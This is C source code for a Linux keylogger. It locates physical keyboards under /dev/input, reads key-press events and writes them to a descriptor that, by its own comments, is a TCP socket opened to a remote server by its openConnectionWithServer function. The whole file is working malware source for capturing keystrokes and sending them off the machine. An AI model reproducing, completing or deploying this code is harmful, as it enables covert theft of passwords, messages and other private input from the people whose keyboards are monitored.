/* Developed by Fabio Cinicolo */

#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <signal.h>
#include <netdb.h>
#include <stdint.h>
#include <linux/input.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/stat.h>
#include <dirent.h>
#include <poll.h>
#include "keylogger.h"

int STOP_KEYLOGGER = 0;

void sigHandler(int signum)
{
    STOP_KEYLOGGER = 1;
}

void startKeylogger(int keyboard, int fd_out)
{
    size_t event_size = sizeof(event);
    event *kbd_events = malloc(event_size * MAX_EVENTS);
    struct sigaction sa;

    sa.sa_flags = 0;
    sa.sa_handler = &sigHandler;

    sigaction(SIGTERM, &sa, NULL);
    sigaction(SIGPIPE, &sa, NULL);
    kbd_events = malloc(event_size * MAX_EVENTS);

    while (!STOP_KEYLOGGER) /* If server closed connection and write failed (SIGPIPE), user sent SIGTERM or another IO error occurred we stop keylogging */
    {
        ssize_t r = read(keyboard, kbd_events, event_size * MAX_EVENTS);
        if (r < 0) /* If read was interrupted by SIGTERM or another error occurred we stop keylogging */
            goto end;
        else
        {
            size_t j = 0;
            for (size_t i = 0; i < r / event_size; i++) /* For each event read */
            {
                if (kbd_events[i].type == EV_KEY && kbd_events[i].value == KEY_PRESSED) /* If a key has been pressed.. */
                    kbd_events[j++] = kbd_events[i];                                    /*  Add the event to the beginning of the array */
            }
            if (!writeEventsIntoFile(fd_out, kbd_events, j * event_size))
                goto end;
        }
    }
end:
    close(fd_out);
    close(keyboard);
    free(kbd_events);
    return;
}

int writeEventsIntoFile(int fd, struct input_event *events, size_t to_write)
{
    ssize_t written;
    do
    {
        written = write(fd, events, to_write);
        if (written < 0) /* It can fail with EPIPE (If server closed socket) or with EINTR if it is interrupted by a signal before any bytes were written */
            return 0;    /* If it is interrupted by a signal after at least one byte was written, it returns the number of bytes written */
        events += written;
        to_write -= written;
    } while (to_write > 0);
    return 1;
}

int *findKeyboards(char *path, int *num_keyboards)
{
    DIR *dir = opendir(path);
    if (dir == NULL)
    {
        perror("Unable to open directory");
        *num_keyboards = 0;
        return NULL;
    }

    struct dirent *file;
    int max_keyboards = 2;
    int *keyboards = malloc(max_keyboards * sizeof(int));
    int num_found = 0;

    while ((file = readdir(dir)) != NULL)
    {
        if (strncmp(file->d_name, "event", 5) == 0)
        {
            char file_path[267];
            snprintf(file_path, sizeof(file_path), "/dev/input/%s", file->d_name);

            int fd = open(file_path, O_RDONLY);
            if (fd > -1 && isKeyboardDevice(fd))
            {
                keyboards[num_found++] = fd;
                if (num_found == max_keyboards)
                {
                    max_keyboards *= 2;
                    keyboards = realloc(keyboards, max_keyboards * sizeof(int));
                }
            }
            else
                close(fd);
        }
    }
    closedir(dir);
    *num_keyboards = num_found;
    return keyboards;
}

int findRealKeyboard(int *keyboards, int num_keyboards, int timeout, int *keyboard)
{

    struct pollfd fds[num_keyboards];
    size_t event_size = sizeof(event);
    event *kbd_events = malloc(event_size * MAX_EVENTS);

    if (keyboards == NULL || num_keyboards <= 0)
        return 0;

    for (int i = 0; i < num_keyboards; i++)
    {
        fds[i].events = POLLIN;
        fds[i].fd = keyboards[i];
    }

    while (1)
    {
        int ready = poll(fds, num_keyboards, timeout);
        if (ready < 0) // timeout seconds passed or poll failed, we assume keyboards were all false positives
            return 0;
        else
        {
            for (int i = 0; i < num_keyboards; i++)
            {
                if (fds[i].revents & POLLIN)
                {
                    ssize_t r;
                    r = read(fds[i].fd, kbd_events, event_size * MAX_EVENTS);
                    if (r < 0)
                        return 0;

                    for (size_t j = 0; j < r / event_size; j++)                                        /* For each event read */
                        if (kbd_events[j].type == EV_KEY && kbd_events[j].value == KEY_PRESSED)        /* If a key has been pressed.. */
                            if (kbd_events[j].code >= KEY_RESERVED && kbd_events[j].code <= KEY_WIMAX) /* And it is a key of a legit keyboard (not a key of a gaming mouse or a joypad, for example)*/
                            {
                                *keyboard = fds[i].fd;
                                return 1;
                            }
                }
            }
        }
    }
    return 0;
}

int isKeyboardDevice(int fd)
{
    int32_t events_bitmask = 0;
    int32_t keys_bitmask = 0;
    int32_t keys = KEY_Q | KEY_A | KEY_Z | KEY_1 | KEY_9;

    if (ioctl(fd, EVIOCGBIT(0, sizeof(events_bitmask)), &events_bitmask) >= 0)          /* Getting bit events supported by device */
        if ((events_bitmask & EV_KEY) == EV_KEY)                                        /* If EV_KEY bit is set then it could be a keyboard, but it can be a false positive (for example, power button has this bit set but it is not a kbd) */
            if (ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(keys_bitmask)), &keys_bitmask) >= 0) /* If it support those keys then we found a device that acts as a keyboard */
                return (keys & keys_bitmask) == keys ? 1 : 0;
    return 0;
}

int openConnectionWithServer(char *ip, short port)
{
    int sock_fd;
    struct hostent *host_info;
    struct sockaddr_in server;

    if ((host_info = gethostbyname(ip)) == NULL) /* Translating hostname into Ip address */
        return 0;

    sock_fd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP); /* Opening Tcp socket */
    if (sock_fd < 0)
        return 0;

    bzero(&server, sizeof(server));

    server.sin_family = AF_INET;
    server.sin_addr = *((struct in_addr *)host_info->h_addr);
    server.sin_port = htons(port);

    if (connect(sock_fd, (struct sockaddr *)&server, sizeof(server)) < 0) /* Connecting to server */
        return 0;

    return sock_fd;
}
